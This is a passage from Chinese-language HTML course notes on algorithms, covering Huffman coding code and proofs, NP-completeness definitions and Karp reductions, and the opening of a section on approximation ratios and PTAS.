</span><span id="__span-0-28"><a id="__codelineno-0-28" name="__codelineno-0-28" href="#note-ads-wk8-__codelineno-0-28"></a>     <span class="c1"># 将新的节点插回堆中</span>
</span><span id="__span-0-29"><a id="__codelineno-0-29" name="__codelineno-0-29" href="#note-ads-wk8-__codelineno-0-29"></a>     <span class="n">heapq</span><span class="o">.</span><span class="n">heappush</span><span class="p">(</span><span class="n">heap</span><span class="p">,</span> <span class="n">merged</span><span class="p">)</span>
</span><span id="__span-0-30"><a id="__codelineno-0-30" name="__codelineno-0-30" href="#note-ads-wk8-__codelineno-0-30"></a>
</span><span id="__span-0-31"><a id="__codelineno-0-31" name="__codelineno-0-31" href="#note-ads-wk8-__codelineno-0-31"></a> <span class="c1"># 返回最终的哈夫曼树的根节点</span>
</span><span id="__span-0-32"><a id="__codelineno-0-32" name="__codelineno-0-32" href="#note-ads-wk8-__codelineno-0-32"></a> <span class="k">return</span> <span class="n">heap</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
</span><span id="__span-0-33"><a id="__codelineno-0-33" name="__codelineno-0-33" href="#note-ads-wk8-__codelineno-0-33"></a>
</span><span id="__span-0-34"><a id="__codelineno-0-34" name="__codelineno-0-34" href="#note-ads-wk8-__codelineno-0-34"></a><span class="k">def</span> <span class="nf">generate_huffman_codes</span><span class="p">(</span><span class="n">node</span><span class="p">,</span> <span class="n">prefix</span><span class="o">=</span><span class="s2">&quot;&quot;</span><span class="p">,</span> <span class="n">codebook</span><span class="o">=</span><span class="p">{}):</span>
</span><span id="__span-0-35"><a id="__codelineno-0-35" name="__codelineno-0-35" href="#note-ads-wk8-__codelineno-0-35"></a> <span class="k">if</span> <span class="n">node</span> <span class="ow">is</span> <span class="ow">not</span> <span class="kc">None</span><span class="p">:</span>
</span><span id="__span-0-36"><a id="__codelineno-0-36" name="__codelineno-0-36" href="#note-ads-wk8-__codelineno-0-36"></a>     <span class="k">if</span> <span class="n">node</span><span class="o">.</span><span class="n">char</span> <span class="ow">is</span> <span class="ow">not</span> <span class="kc">None</span><span class="p">:</span>
</span><span id="__span-0-37"><a id="__codelineno-0-37" name="__codelineno-0-37" href="#note-ads-wk8-__codelineno-0-37"></a>         <span class="c1"># 叶子节点，存储编码</span>
</span><span id="__span-0-38"><a id="__codelineno-0-38" name="__codelineno-0-38" href="#note-ads-wk8-__codelineno-0-38"></a>         <span class="n">codebook</span><span class="p">[</span><span class="n">node</span><span class="o">.</span><span class="n">char</span><span class="p">]</span> <span class="o">=</span> <span class="n">prefix</span>
</span><span id="__span-0-39"><a id="__codelineno-0-39" name="__codelineno-0-39" href="#note-ads-wk8-__codelineno-0-39"></a>     <span class="k">else</span><span class="p">:</span>
</span><span id="__span-0-40"><a id="__codelineno-0-40" name="__codelineno-0-40" href="#note-ads-wk8-__codelineno-0-40"></a>         <span class="c1"># 递归遍历左右子树</span>
</span><span id="__span-0-41"><a id="__codelineno-0-41" name="__codelineno-0-41" href="#note-ads-wk8-__codelineno-0-41"></a>         <span class="n">generate_huffman_codes</span><span class="p">(</span><span class="n">node</span><span class="o">.</span><span class="n">left</span><span class="p">,</span> <span class="n">prefix</span> <span class="o">+</span> <span class="s2">&quot;0&quot;</span><span class="p">,</span> <span class="n">codebook</span><span class="p">)</span>
</span><span id="__span-0-42"><a id="__codelineno-0-42" name="__codelineno-0-42" href="#note-ads-wk8-__codelineno-0-42"></a>         <span class="n">generate_huffman_codes</span><span class="p">(</span><span class="n">node</span><span class="o">.</span><span class="n">right</span><span class="p">,</span> <span class="n">prefix</span> <span class="o">+</span> <span class="s2">&quot;1&quot;</span><span class="p">,</span> <span class="n">codebook</span><span class="p">)</span>
</span><span id="__span-0-43"><a id="__codelineno-0-43" name="__codelineno-0-43" href="#note-ads-wk8-__codelineno-0-43"></a> <span class="k">return</span> <span class="n">codebook</span>
</span></code></pre></div>
<p>伪代码
<div class="language-cpp highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#note-ads-wk8-__codelineno-1-1"></a><span class="kt">void</span><span class="w"> </span><span class="nf">Huffman</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="n">PriorityQueue</span><span class="w">  </span><span class="n">heap</span><span class="p">[</span><span class="w"> </span><span class="p">],</span><span class="w">  </span><span class="kt">int</span><span class="w">  </span><span class="n">C</span><span class="w"> </span><span class="p">)</span>
</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#note-ads-wk8-__codelineno-1-2"></a><span class="p">{</span><span class="w">   </span><span class="n">consider</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">C</span><span class="w"> </span><span class="n">characters</span><span class="w"> </span><span class="n">as</span><span class="w"> </span><span class="n">C</span><span class="w"> </span><span class="n">single</span><span class="w"> </span><span class="n">node</span><span class="w"> </span><span class="n">binary</span><span class="w"> </span><span class="n">trees</span><span class="p">,</span>
</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#note-ads-wk8-__codelineno-1-3"></a><span class="w">     </span><span class="k">and</span><span class="w"> </span><span class="n">initialize</span><span class="w"> </span><span class="n">them</span><span class="w"> </span><span class="n">into</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">min</span><span class="w"> </span><span class="n">heap</span><span class="p">;</span>
</span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4" href="#note-ads-wk8-__codelineno-1-4"></a><span class="w">     </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">C</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="o">++</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"> </span>
</span><span id="__span-1-5"><a id="__codelineno-1-5" name="__codelineno-1-5" href="#note-ads-wk8-__codelineno-1-5"></a><span class="w">        </span><span class="n">create</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">node</span><span class="p">;</span>
</span><span id="__span-1-6"><a id="__codelineno-1-6" name="__codelineno-1-6" href="#note-ads-wk8-__codelineno-1-6"></a><span class="w">        </span><span class="cm">/* be greedy here */</span>
</span><span id="__span-1-7"><a id="__codelineno-1-7" name="__codelineno-1-7" href="#note-ads-wk8-__codelineno-1-7"></a><span class="w">        </span><span class="k">delete</span><span class="w"> </span><span class="n">root</span><span class="w"> </span><span class="n">from</span><span class="w"> </span><span class="n">min</span><span class="w"> </span><span class="n">heap</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="n">attach</span><span class="w"> </span><span class="n">it</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">left_child</span><span class="w"> </span><span class="n">of</span><span class="w"> </span><span class="n">node</span><span class="p">;</span>
</span><span id="__span-1-8"><a id="__codelineno-1-8" name="__codelineno-1-8" href="#note-ads-wk8-__codelineno-1-8"></a><span class="w">        </span><span class="k">delete</span><span class="w"> </span><span class="n">root</span><span class="w"> </span><span class="n">from</span><span class="w"> </span><span class="n">min</span><span class="w"> </span><span class="n">heap</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="n">attach</span><span class="w"> </span><span class="n">it</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">right_child</span><span class="w"> </span><span class="n">of</span><span class="w"> </span><span class="n">node</span><span class="p">;</span>
</span><span id="__span-1-9"><a id="__codelineno-1-9" name="__codelineno-1-9" href="#note-ads-wk8-__codelineno-1-9"></a><span class="w">        </span><span class="n">weight</span><span class="w"> </span><span class="n">of</span><span class="w"> </span><span class="n">node</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">sum</span><span class="w"> </span><span class="n">of</span><span class="w"> </span><span class="n">weights</span><span class="w"> </span><span class="n">of</span><span class="w"> </span><span class="n">its</span><span class="w"> </span><span class="n">children</span><span class="p">;</span>
</span><span id="__span-1-10"><a id="__codelineno-1-10" name="__codelineno-1-10" href="#note-ads-wk8-__codelineno-1-10"></a><span class="w">        </span><span class="cm">/* weight of a tree = sum of the frequencies of its leaves */</span>
</span><span id="__span-1-11"><a id="__codelineno-1-11" name="__codelineno-1-11" href="#note-ads-wk8-__codelineno-1-11"></a><span class="w">        </span><span class="n">insert</span><span class="w"> </span><span class="n">node</span><span class="w"> </span><span class="n">into</span><span class="w"> </span><span class="n">min</span><span class="w"> </span><span class="n">heap</span><span class="p">;</span>
</span><span id="__span-1-12"><a id="__codelineno-1-12" name="__codelineno-1-12" href="#note-ads-wk8-__codelineno-1-12"></a><span class="w">   </span><span class="p">}</span>
</span><span id="__span-1-13"><a id="__codelineno-1-13" name="__codelineno-1-13" href="#note-ads-wk8-__codelineno-1-13"></a><span class="p">}</span>
</span></code></pre></div></p>
</details>
</div>
<h3 id="note-ads-wk8-huffman_1">Huffman编码正确性<a class="headerlink" href="#note-ads-wk8-huffman_1" title="Permanent link">&para;</a></h3>
<h4 id="note-ads-wk8-_5">贪心选择性质<a class="headerlink" href="#note-ads-wk8-_5" title="Permanent link">&para;</a></h4>
<p><span class="arithmatex">\(C\)</span> 为一个字母表，其中每个字符 <span class="arithmatex">\(c \in C\)</span> 都有一个频率 <span class="arithmatex">\(c.freq\)</span>.令 <span class="arithmatex">\(x\)</span> 和 <span class="arithmatex">\(y\)</span> 是 <span class="arithmatex">\(C\)</span> 中频率最低的两个字符。那么存在 <span class="arithmatex">\(C\)</span> 的一个最优前缀码，<span class="arithmatex">\(x\)</span> 和 <span class="arithmatex">\(y\)</span> 的码字长度相同，且只有最后一个二进制位不同(即在编码二叉树中，它们是兄弟节点)。</p>
<div align="center">
    <img src="../NOTE/ADS/part1/28.png" width=60%/>
</div>

<p>我们也可以用交换法，如上图，可以证明交换后的树所用的编码长度不会变大，如果原来的是最优解，那么交换后的也是最优解。</p>
<h4 id="note-ads-wk8-_6">最优子结构<a class="headerlink" href="#note-ads-wk8-_6" title="Permanent link">&para;</a></h4>
<p><span class="arithmatex">\(C\)</span> 为一个字母表，其中每个字符 <span class="arithmatex">\(c \in C\)</span> 都有一个频率 <span class="arithmatex">\(c.freq\)</span>。令 <span class="arithmatex">\(x\)</span> 和 <span class="arithmatex">\(y\)</span>是 <span class="arithmatex">\(C\)</span> 中频率最低的两个字符。令 <span class="arithmatex">\(C′\)</span> 为 <span class="arithmatex">\(C\)</span> 去掉字符 <span class="arithmatex">\(x\)</span> 和 <span class="arithmatex">\(y\)</span>，加入一个新字符 <span class="arithmatex">\(z\)</span> 后的字母表。我们给
<span class="arithmatex">\(C′\)</span> 也定义频率集合，不同之处只是 <span class="arithmatex">\(z.freq = x.freq + y.freq\)</span>。令 <span class="arithmatex">\(T′\)</span> 为 <span class="arithmatex">\(C′\)</span> 的任意一个最优前缀码树，那么我们可以将 <span class="arithmatex">\(T′\)</span> 中叶结点 <span class="arithmatex">\(z\)</span> 替换为一个以 <span class="arithmatex">\(x\)</span> 和 <span class="arithmatex">\(y\)</span> 为孩子的内部结点得到一个 <span class="arithmatex">\(C\)</span> 的一个最优前缀码树 <span class="arithmatex">\(T\)</span>。</p>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>如果上面这一命题正确，那么我们每次合并 <span class="arithmatex">\(x\)</span> 和 <span class="arithmatex">\(y\)</span> 得到 <span class="arithmatex">\(z\)</span> 之后，按照没有 <span class="arithmatex">\(x\)</span> 和 <span class="arithmatex">\(y\)</span>，只有 <span class="arithmatex">\(z\)</span> 的子问题继续推进我们的贪心算法可以得到 <span class="arithmatex">\(T′\)</span> 这一子问题的最优解，它和合并 <span class="arithmatex">\(x\)</span> 和 <span class="arithmatex">\(y\)</span> 得到 <span class="arithmatex">\(z\)</span> 这一前面已经验证正确性的贪心选择一起，就构成了整体的最优解。</p>
</div>
<div align="center">
    <img src="../NOTE/ADS/part1/29.png" width=60%/>
</div>

<div class="admonition proof">
<p class="admonition-title">使用反证法证明</p>
<p>首先我们有</p>
<div class="arithmatex">\[
    B(T) = B(T') + x.freq + y.freq
\]</div>
<p>因为<span class="arithmatex">\(T'\)</span>相当于把<span class="arithmatex">\(T\)</span>中<span class="arithmatex">\(x,y\)</span>上移一层，假设<span class="arithmatex">\(T\)</span>不是最优解，那么存在一个更优解<span class="arithmatex">\(T''\)</span>，使得</p>
<div class="arithmatex">\[
    B(T'') &lt; B(T)
\]</div>
<p>即</p>
<div class="arithmatex">\[
    B(T'') &lt; B(T') + x.freq + y.freq
\]</div>
<p>则有</p>
<div class="arithmatex">\[
  B(T''') = B(T'')- x.freq - y.freq &lt; B(T')
\]</div>
<p>其中<span class="arithmatex">\(T'''\)</span>是<span class="arithmatex">\(T''\)</span>中<span class="arithmatex">\(x,y\)</span>合并成<span class="arithmatex">\(z\)</span>得到的树，这与<span class="arithmatex">\(T'\)</span>是最优解矛盾，所以<span class="arithmatex">\(T\)</span>是最优解，证毕。</p>
</div></section><section class="print-page" id="note-ads-wk9" heading-number="2.2.3.11"><h1 id="note-ads-wk9-np">NP完全性<a class="headerlink" href="#note-ads-wk9-np" title="Permanent link">&para;</a></h1>
<div style="margin-top: -30px; font-size: 0.75em; opacity: 0.7;">
<p><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 2A10 10 0 0 0 2 12a10 10 0 0 0 10 10 10 10 0 0 0 10-10h-2a8 8 0 0 1-8 8 8 8 0 0 1-8-8 8 8 0 0 1 8-8zm6.78 1a.7.7 0 0 0-.48.2l-1.22 1.21 2.5 2.5L20.8 5.7c.26-.26.26-.7 0-.95L19.25 3.2c-.13-.13-.3-.2-.47-.2m-2.41 2.12L9 12.5V15h2.5l7.37-7.38z"/></svg></span> 约 1229 个字 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 20c4.42 0 8-3.58 8-8s-3.58-8-8-8-8 3.58-8 8 3.58 8 8 8m0-18c5.5 0 10 4.5 10 10s-4.5 10-10 10C6.47 22 2 17.5 2 12S6.5 2 12 2m.5 11H11V7h1.5v4.26l3.7-2.13.75 1.3z"/></svg></span> 预计阅读时间 4 分钟</p>
</div>
<h2 id="note-ads-wk9-_1">基本概念<a class="headerlink" href="#note-ads-wk9-_1" title="Permanent link">&para;</a></h2>
<div class="admonition definition">
<p class="admonition-title">Definition</p>
<div class="tabbed-set tabbed-alternate" data-tabs="1:4"><input checked="checked" id="note-ads-wk9-_1-p问题" name="note-ads-wk9-__tabbed_1" type="radio" /><input id="note-ads-wk9-_1-np问题" name="note-ads-wk9-__tabbed_1" type="radio" /><input id="note-ads-wk9-_1-np-hard问题" name="note-ads-wk9-__tabbed_1" type="radio" /><input id="note-ads-wk9-_1-np完全问题" name="note-ads-wk9-__tabbed_1" type="radio" /><div class="tabbed-labels"><label for="note-ads-wk9-_1-p问题">P问题</label><label for="note-ads-wk9-_1-np问题">NP问题</label><label for="note-ads-wk9-_1-np-hard问题">NP-hard问题</label><label for="note-ads-wk9-_1-np完全问题">NP完全问题</label></div>
<div class="tabbed-content">
<div class="tabbed-block">
<p>由多项式时间算法解决的问题集合。</p>
<p>其中多项式时间算法指的是<mark class="critic">算法的时间复杂度与输入的长度之间是多项式关系</mark></p>
</div>
<div class="tabbed-block">
<p>NP(Non-deterministic Polynomial time)问题是指可以在多项式时间内验证一个解的问题集合。但是并不确定能不能在多项式时间内找到一个解。</p>
<details class="note">
<summary>多项式时间验证</summary>
<p>we say <span class="arithmatex">\(B\)</span> is an efficient verifier for problem <span class="arithmatex">\(X\)</span> if </p>
<ul>
<li>
<p><span class="arithmatex">\(B\)</span> runs in polynomial time,taking two arguments: an instance <span class="arithmatex">\(x\)</span> and a certificate <span class="arithmatex">\(y\)</span>.</p>
</li>
<li>
<p>there exists a polynomial <span class="arithmatex">\(p\)</span> such that for every <span class="arithmatex">\(x\)</span> in <span class="arithmatex">\(X\)</span>, there is a certificate <span class="arithmatex">\(y\)</span> of length at most <span class="arithmatex">\(p(|x|)\)</span> such that <span class="arithmatex">\(B\)</span>
accepts <span class="arithmatex">\((x,y)\)</span></p>
</li>
</ul>
</details>
</div>
<div class="tabbed-block">
<p>NP-hard问题是指所有的NP问题都能在多项式时间内约化为该问题。NP-hard问题不一定是NP问题,它是比NP问题更难的问题。</p>
</div>
<div class="tabbed-block">
<p>NPC(NP-Complete)问题是指既是NP问题，又是NP问题中最难的问题(NP-hard)。如果能在多项式时间内解决一个NPC问题，那么所有的NP问题都能在多项式时间内解决。也就是说</p>
<div class="arithmatex">\[
    P=NP \Rightarrow P=NP=NPC
\]</div>
</div>
</div>
</div>
<div class="admonition property">
<p class="admonition-title">四者关系</p>
<ul>
<li>P问题能在多项式时间内解决，自然也能在多项式时间内验证，所以P问题是NP问题的子集。<span class="arithmatex">\(P \subseteq NP\)</span></li>
<li>NPC问题是NP问题的子集，<span class="arithmatex">\(NPC \subseteq NP\)</span></li>
<li>NPC问题也是NP-hard问题的子集，<span class="arithmatex">\(NPC \subseteq NP-hard\)</span>，<span class="arithmatex">\(NPC=NP \cap NP-hard\)</span></li>
<li>NP-hard问题不一定是NP问题，<span class="arithmatex">\(NP-hard \nsubseteq NP\)</span></li>
<li>如果NPC问题能在多项式时间内解决，那么所有的NP问题都能在多项式时间内解决，<span class="arithmatex">\(P=NP \Rightarrow P=NP=NPC\)</span></li>
</ul>
</div>
</div>
<h2 id="note-ads-wk9-_2">常见的多项式时间问题<a class="headerlink" href="#note-ads-wk9-_2" title="Permanent link">&para;</a></h2>
<ul>
<li>最短路径问题：：给定一个有向图<span class="arithmatex">\(G = (V, E)\)</span>即使是带负权的，我们可以在 <span class="arithmatex">\(O(|V||E|)\)</span> 的时间内找到从单一源顶点开始的最短路径；这是多项式时间的，因为图中我们的输入规模可以视为 <span class="arithmatex">\(|V|+|E|\)</span></li>
<li>欧拉回路问题：是否存在一条路径，经过图中每条边恰好一次，且最终回到起点。这个问题可以在 <span class="arithmatex">\(O(|E|)\)</span> 的时间内使用深度优先搜索解决。</li>
<li><span class="arithmatex">\(2-SAT\)</span>问题：给定一个合取范式(如果它是由 <span class="arithmatex">\(2\)</span> 个子句的合取构成的，每个子句是由<span class="arithmatex">\(2\)</span>个变量或者它们的否定构成的析取)，也可以在多项式时间内找到是否存在变量的0，1赋值，使得合取式为真。</li>
</ul>
<div class="admonition warning">
<p class="admonition-title">0-1背包问题</p>
<p>0-1背包问题的时间复杂度是指数级别的，不是多项式时间的。其背包容量是使用2进制表示的(<span class="arithmatex">\(\log C\)</span>),前面讨论的<span class="arithmatex">\(n\)</span>指的是<span class="arithmatex">\(n\)</span>个2进制编码</p>
</div>
<h2 id="note-ads-wk9-formal-language">形式语言(formal language)<a class="headerlink" href="#note-ads-wk9-formal-language" title="Permanent link">&para;</a></h2>
<p>一个形式语言<span class="arithmatex">\(L\)</span>是一个字符串的集合，<span class="arithmatex">\(L \subseteq \Sigma^*\)</span>，其中<span class="arithmatex">\(\Sigma\)</span>是一个有限的字母表,其上的字符串(string)是字母表上的字符的有限序列,所有这样的字符串构成了<span class="arithmatex">\(\Sigma^*\)</span>。</p>
<ul>
<li><mark class="critic">至多可数的集合上的有限字符串是可数的</mark></li>
<li><mark class="critic">语言可以做衔接、并、交、补、Kleene 闭包(由集合中的符号生成的所有可能的有限长度的字符串所构成的集合)等运算</mark></li>
</ul>
<div class="admonition definition">
<p class="admonition-title">Definition</p>
<div class="tabbed-set tabbed-alternate" data-tabs="2:3"><input checked="checked" id="note-ads-wk9-formal-language-判定问题" name="note-ads-wk9-__tabbed_2" type="radio" /><input id="note-ads-wk9-formal-language-搜索问题" name="note-ads-wk9-__tabbed_2" type="radio" /><input id="note-ads-wk9-formal-language-转换问题" name="note-ads-wk9-__tabbed_2" type="radio" /><div class="tabbed-labels"><label for="note-ads-wk9-formal-language-判定问题">判定问题</label><label for="note-ads-wk9-formal-language-搜索问题">搜索问题</label><label for="note-ads-wk9-formal-language-转换问题">转换问题</label></div>
<div class="tabbed-content">
<div class="tabbed-block">
<p>给定语言<span class="arithmatex">\(L\)</span>,输入某一个字符串<span class="arithmatex">\(w\)</span>，判定问题是指判断<span class="arithmatex">\(w\)</span>是否属于<span class="arithmatex">\(L\)</span>。如果<span class="arithmatex">\(w \in L\)</span>，则输出YES，否则输出NO。(decision problem)</p>
<p><span class="arithmatex">\(A\)</span> solves problem <span class="arithmatex">\(L\)</span> (<span class="arithmatex">\(A\)</span> decides language <span class="arithmatex">\(L\)</span>) if for every <span class="arithmatex">\(w \in \Sigma^*\)</span></p>
<p><span class="arithmatex">\(A\)</span> accepts <span class="arithmatex">\(w\)</span> if and only if  <span class="arithmatex">\(w \in L\)</span></p>
</div>
<div class="tabbed-block">
<p>给定语言<span class="arithmatex">\(L\)</span>,搜索问题是指找到一个<span class="arithmatex">\(w\)</span>，使得<span class="arithmatex">\(w \in L\)</span>。</p>
</div>
<div class="tabbed-block">
<p>给定语言<span class="arithmatex">\(L_1\)</span>和<span class="arithmatex">\(L_2\)</span>，计算某个从<span class="arithmatex">\(L_1\)</span>到<span class="arithmatex">\(L_2\)</span>的函数<span class="arithmatex">\(f\)</span>。</p>
</div>
</div>
</div>
</div>
<h2 id="note-ads-wk9-karp">Karp归约<a class="headerlink" href="#note-ads-wk9-karp" title="Permanent link">&para;</a></h2>
<p>称一个语言<span class="arithmatex">\(L_1\)</span>可以多项式归约( <span class="arithmatex">\(Karp\)</span> 归约)到另一个语言<span class="arithmatex">\(L_2\)</span>，如果存在一个多项式时间的计算函数<span class="arithmatex">\(f\)</span>，使得</p>
<div class="arithmatex">\[
    w \in L_1 \Leftrightarrow f(w) \in L_2
\]</div>
<p>记作<span class="arithmatex">\(L_1 \leqslant_p L_2\)</span>。此时说明 <span class="arithmatex">\(L_2\)</span> 至少和 <span class="arithmatex">\(L_1\)</span> 一样难。</p>
<p>那么对于<span class="arithmatex">\(NP\)</span>和<span class="arithmatex">\(P\)</span>的关系，我们可以得到如下结论：</p>
<p>如果我们找到了一个<span class="arithmatex">\(NPC\)</span>问题，那么所有的<span class="arithmatex">\(NP\)</span>问题都可以归约到这个<span class="arithmatex">\(NPC\)</span>问题，也就是说，如果我们能在多项式时间内解决一个<span class="arithmatex">\(NPC\)</span>问题，那么所有的<span class="arithmatex">\(NP\)</span>问题都可以在多项式时间内解决。此时有</p>
<div class="arithmatex">\[
    P=NP \Rightarrow P=NP=NPC
\]</div>
<p>如果我们不能在多项式时间内解决一个<span class="arithmatex">\(NPC\)</span>问题，那么因为<span class="arithmatex">\(NPC\)</span>问题是<span class="arithmatex">\(NP\)</span>问题的子集，所以<span class="arithmatex">\(P\)</span>是不等于<span class="arithmatex">\(NP\)</span>的。</p>
<p>但是很遗憾的是，目前还没有人能够证明<span class="arithmatex">\(P\)</span>是否等于<span class="arithmatex">\(NP\)</span>，也就是说我们还不知道<span class="arithmatex">\(NPC\)</span>问题是否可以在多项式时间内解决。</p></section><section class="print-page" id="note-ads-wk10" heading-number="2.2.3.12"><h1 id="note-ads-wk10-_1">近似算法<a class="headerlink" href="#note-ads-wk10-_1" title="Permanent link">&para;</a></h1>
<div style="margin-top: -30px; font-size: 0.75em; opacity: 0.7;">
<p><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 2A10 10 0 0 0 2 12a10 10 0 0 0 10 10 10 10 0 0 0 10-10h-2a8 8 0 0 1-8 8 8 8 0 0 1-8-8 8 8 0 0 1 8-8zm6.78 1a.7.7 0 0 0-.48.2l-1.22 1.21 2.5 2.5L20.8 5.7c.26-.26.26-.7 0-.95L19.25 3.2c-.13-.13-.3-.2-.47-.2m-2.41 2.12L9 12.5V15h2.5l7.37-7.38z"/></svg></span> 约 2053 个字 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 20c4.42 0 8-3.58 8-8s-3.58-8-8-8-8 3.58-8 8 3.58 8 8 8m0-18c5.5 0 10 4.5 10 10s-4.5 10-10 10C6.47 22 2 17.5 2 12S6.5 2 12 2m.5 11H11V7h1.5v4.26l3.7-2.13.75 1.3z"/></svg></span> 预计阅读时间 7 分钟</p>
</div>
<p>对于一个最优化问题的算法，主要有以下三个期望</p>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>1.算法需要能找到确切的最优解
2.算法需要能高效(在多项式时间内)运行
3.算法是通用的,需要可以解决一类问题中的所有实例，而不仅仅是单个实例有效</p>
</div>
<p>然而，对于某些问腿，我们有可能无法实现以上三个期望，例如NPC问题，所以我们可以退而求其次，做一些妥协；</p>
<ul>
<li>如果算法舍弃第二个期望，则是用例如回溯等方法在指数时间内解决问题，这对于输入不大的情况是可以接受的；</li>
<li>如果舍弃第三个期望，我们相当于为问题找到一些容易解决的特例；</li>
<li>如果舍弃第一个期望，但我们能保证高效找到的解是和真正的最优解 “相差不大” 的，那么我们称这类算法为近似算法。</li>
</ul>
<h2 id="note-ads-wk10-_2">基本概念<a class="headerlink" href="#note-ads-wk10-_2" title="Permanent link">&para;</a></h2>
<div class="admonition definition">
<p class="admonition-title">Definition</p>
<p>假设有某类问题 <span class="arithmatex">\(\mathcal{I}\)</span>（例如背包问题），其中的一个具体实例记为 <span class="arithmatex">\(I\)</span>（当给定问题的参数定义的时候即为一个实例），且有一个复杂度为多项式的近似算法 <span class="arithmatex">\(A\)</span>。定义：</p>
<ul>
<li><span class="arithmatex">\(A(I)\)</span> 为算法 <span class="arithmatex">\(A\)</span> 在实例 <span class="arithmatex">\(I\)</span> 上得到的解；</li>
<li><span class="arithmatex">\(\mathbf{OPT}(I)\)</span> 为实例 <span class="arithmatex">\(I\)</span> 的最优解。</li>
</ul>
<p>考虑 <span class="arithmatex">\(I\)</span> 是最小化问题，若存在 <span class="arithmatex">\(r &gt; 1\)</span>，对任意的 <span class="arithmatex">\(I\)</span> 都有：</p>
<div class="arithmatex">\[
A(I) \leqslant r \cdot \mathbf{OPT}(I),
\]</div>
<p>那么称 <span class="arithmatex">\(A\)</span> 为该问题的 <span class="arithmatex">\(r\)</span>-近似算法（即对于任何可能的问题实例，<span class="arithmatex">\(A\)</span> 给出的解都不会比最优解的 <span class="arithmatex">\(r\)</span> 倍大）。我们特别关心其中可以取到的最小 <span class="arithmatex">\(r\)</span>，称：</p>
<div class="arithmatex">\[
\rho = \inf\{r : A(I) \leqslant r \cdot \mathbf{OPT}(I), \forall I\}
\]</div>
<p>为 <strong>近似比</strong>（approximation ratio），即算法 <span class="arithmatex">\(A\)</span> 最紧的近似界。它可以等价定义为：</p>
<div class="arithmatex">\[
\rho = \sup_{\mathcal{I}} \frac{A(I)}{\mathbf{OPT}(I)}
\]</div>
<p>即这个比值在多实例中的比值是最紧的界。反之，如果是最大化问题，那么上述公式改为：</p>
<div class="arithmatex">\[
\rho = \sup_{\mathcal{I}} \frac{\mathbf{OPT}(I)}{A(I)}
\]</div>
<p>将两者合并起来，可以统一写作：</p>
<div class="arithmatex">\[
\rho = \sup_{\mathcal{I}} \left\{ \frac{\mathbf{OPT}(I)}{A(I)}, \frac{A(I)}{\mathbf{OPT}(I)} \right\}.
\]</div>
</div>
<p>由于<span class="arithmatex">\(OPT\)</span>算法一般是难以确定的，所以确定近似比一般有以下两个步骤</p>
<ol>
<li>
<p>首先寻找到一个 <span class="arithmatex">\( r &gt; 1 \)</span>，对于任何实例 <span class="arithmatex">\( I \)</span>，都有 <span class="arithmatex">\( A(I) \leqslant r \cdot \text{OPT}(I) \)</span>（可以首先找到 <span class="arithmatex">\( \text{OPT}(I) \)</span> 的一个下界 <span class="arithmatex">\( \text{LB}(I) \leqslant \text{OPT}(I) \)</span>，然后让 <span class="arithmatex">\( A(I) \leqslant r \cdot \text{LB}(I) \)</span> 即可）；</p>
</li>
<li>
<p>接下来证明 <span class="arithmatex">\( r \)</span> 是不可改进的，即对于任意的 <span class="arithmatex">\( \epsilon &gt; 0 \)</span>，都存在在一个实例 <span class="arithmatex">\( I_\epsilon \)</span>，使得 <span class="arithmatex">\( A(I_\epsilon) \geqslant (r-\epsilon) \cdot \text{OPT}(I_\epsilon) \)</span>。</p>
</li>
</ol>
<h3 id="note-ads-wk10-ptas">PTAS<a class="headerlink" href="#note-ads-wk10-ptas" title="Permanent link">&para;</a></h3>
<p>PTAS（多项式时间近似方案，Polynomial time approximation scheme）：存在算法 A，使得对每一个固定的 <span class="arithmatex">\(\varepsilon &gt; 0\)</span>，对任意的实例 <span class="arithmatex">\(I\)</span> 都有</p>
<div class="arithmatex">\[
    A(I) \leqslant (1+\varepsilon) \cdot \text{OPT}(I)
\]</div>
<p>且算法 <span class="arithmatex">\( A \)</span> 的运行时间可以被问题规模 <span class="arithmatex">\( |I| \)</span> 的多项式上界所限制。则称 <span class="arithmatex">\( A \)</span> 是该问题的一个 PTAS。</p>
<p>理论上，算法 <span class="arithmatex">\( A \)</span> 在多项式时间内可以近似：不过不同的 <span class="arithmatex">\( \varepsilon \)</span>，<span class="arithmatex">\( A \)</span> 的运行时间也可能不可能。例如，如果算法可以给出一个复杂度为 <span class="arithmatex">\( O(|I|^{1/\epsilon}) \)</span> 的解，这样算法的表现就会很糟糕，因为指数很大。一般可以将 PTAS 的复杂度记为 <span class="arithmatex">\( O(|I|^{(1/\epsilon)}) \)</span>。</p>
<h3 id="note-ads-wk10-eptasfptas">EPTAS和FPTAS<a class="headerlink" href="#note-ads-wk10-eptasfptas" title="Permanent link">&para;</a></h3>
